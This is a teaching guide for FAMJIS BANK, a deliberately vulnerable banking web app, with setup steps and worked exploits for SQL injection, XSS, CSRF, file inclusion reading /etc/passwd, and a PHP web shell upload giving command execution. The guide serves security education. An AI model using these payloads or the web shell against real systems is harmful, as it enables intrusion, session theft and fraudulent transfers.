
# **Comprehensive Web Application Vulnerability Lab**  
**FAMJIS BANK: A Deliberately Vulnerable Banking Portal**  

---

## **1. Lab Description**  
**FAMJIS BANK** is a **deliberately insecure** web application designed for cybersecurity education. It mimics a **real online banking system** with a **premium UI** while containing **multiple OWASP Top 10 vulnerabilities** for hands-on security testing.  

**Lab Features:**  
✔ **Real-world banking functionalities** (login, transfers, admin panel)  
✔ **Multiple vulnerabilities** (SQLi, XSS, CSRF, IDOR, LFI, RCE)  
✔ **Step-by-step exploit scenarios** for guided learning  
✔ **Instructor & student-friendly** (Easy setup, clear objectives)  

---

## **2. Prerequisites**  
### **For Students & Instructors**  
✅ Basic understanding of **web applications** (HTML, PHP, SQL)  
✅ Familiarity with **Burp Suite, OWASP ZAP, or manual testing**  
✅ Kali Linux (or any Linux with **XAMPP/LAMP**)  

### **System Requirements**  
- **OS:** Kali Linux (Recommended) / Ubuntu / Windows (WSL)  
- **Web Server:** XAMPP / LAMP  
- **Database:** MySQL  
- **Browser:** Firefox / Chrome (with F12 DevTools)  

---

## **3. Lab Objectives**  
By the end of this lab, students should be able to:  
🔹 **Identify & exploit SQL Injection (SQLi)**  
🔹 **Perform Cross-Site Scripting (XSS) attacks**  
🔹 **Bypass authentication via IDOR & CSRF**  
🔹 **Execute Local File Inclusion (LFI) & Remote Code Execution (RCE)**  
🔹 **Understand mitigation techniques** (Prepared statements, input validation)  

---

## **4. Step-by-Step Setup**  

### **A. Install XAMPP (Kali Linux)**
```bash
wget https://www.apachefriends.org/xampp-files/8.2.4/xampp-linux-x64-8.2.4-0-installer.run
chmod +x xampp-linux-x64-8.2.4-0-installer.run
sudo ./xampp-linux-x64-8.2.4-0-installer.run
sudo /opt/lampp/lampp start
```

### **B. Deploy FAMJIS BANK**
```bash
git clone https://github.com/Faisalauchan/famjis-bank.git
sudo cp -r famjis-bank /opt/lampp/htdocs/
sudo chmod -R 777 /opt/lampp/htdocs/famjis-bank/uploads
```

### **C. Import Database**
```bash
mysql -u root -p < /opt/lampp/htdocs/famjis-bank/database.sql
```

### **D. Access the Lab**
🌐 **URL:** `http://localhost/famjis-bank/`  
👤 **Admin Login:** `admin:admin123`  

---

## **5. Exploring Vulnerabilities**  

### **Vulnerability 1: SQL Injection (SQLi)**
- **Location:** `login.php`  
- **Exploit:**  
  ```sql
  Username: admin' --  
  Password: [anything]  
  ```
- **Impact:** Bypass authentication as admin.  

### **Vulnerability 2: Cross-Site Scripting (XSS)**
- **Location:** `transfer.php` (Description field)  
- **Exploit:**  
  ```html
  <script>alert('XSS')</script>
  ```
- **Impact:** Steal session cookies via `document.cookie`.  

### **Vulnerability 3: CSRF (Cross-Site Request Forgery)**
- **Location:** `transfer.php` (No CSRF token)  
- **Exploit:**  
  ```html
  <form action="http://localhost/famjis-bank/transfer.php" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="recipient" value="attacker">
    <input type="submit" value="Click for Free Money!">
  </form>
  ```
- **Impact:** Unauthorized fund transfers.  

### **Vulnerability 4: Local File Inclusion (LFI)**
- **Location:** `statements.php?file=`  
- **Exploit:**  
  ```
  http://localhost/famjis-bank/statements.php?file=../../../../etc/passwd
  ```
- **Impact:** Read sensitive system files.  

### **Vulnerability 5: Remote Code Execution (RCE)**
- **Location:** `upload.php` (Profile picture upload)  
- **Exploit:**  
  1. Upload `shell.php` (`<?php system($_GET['cmd']); ?>`)  
  2. Access at `http://localhost/famjis-bank/uploads/shell.php?cmd=id`  
- **Impact:** Full server compromise.  

---

## **6. Example Testing Scenarios**  

| **Scenario** | **Objective** | **Tools Used** |
|-------------|--------------|----------------|
| **Bypass Login** | Exploit SQLi to log in as admin without a password | Browser, Burp Suite |
| **Steal Cookies** | Perform XSS to hijack sessions | `document.cookie` + Netcat |
| **Forge Transactions** | Execute CSRF attack to transfer funds | Malicious HTML form |
| **Read /etc/passwd** | Exploit LFI to leak system files | Curl / Browser |
| **Gain RCE** | Upload a PHP shell for command execution | AntSword / Manual |

---

## **7. Notes & Best Practices**  

### **For Students**  
🔹 **Always test ethically** (Never attack systems without permission).  
🔹 **Document findings** (Take screenshots, record payloads).  
🔹 **Understand mitigations** (How would you fix each vulnerability?).  

### **For Instructors**  
🔹 **Use a controlled environment** (Virtual machines, isolated networks).  
🔹 **Discuss real-world breaches** (Equifax, Sony, etc.).  
🔹 **Encourage reporting** (Teach responsible disclosure).  

---

## **8. Additional Resources**  
📚 **Books:**  
- *The Web Application Hacker’s Handbook* (Dafydd Stuttard)  
- *OWASP Testing Guide*  

🛠 **Tools:**  
- Burp Suite Community  
- OWASP ZAP  
- SQLmap  

🌐 **Websites:**  
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)  
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)  

---

## **9. Ethical Considerations**  
⚠ **Legal Compliance:**  
- Only use this lab in **authorized environments**.  
- Never test **production systems** without permission.  

⚖ **Responsible Disclosure:**  
- If vulnerabilities are found in real systems, **report them ethically**.  

---

## **10. Lab Conclusion**  
This lab provides a **safe, controlled environment** to practice **real-world web app exploitation** while learning **defensive coding practices**.  

**Next Steps:**  
- Try **advanced exploits** (JWT cracking, SSRF chaining).  
- Implement **security patches** (e.g., CSP for XSS).  

Would you like a **PDF version** of this guide for classroom use? 📄
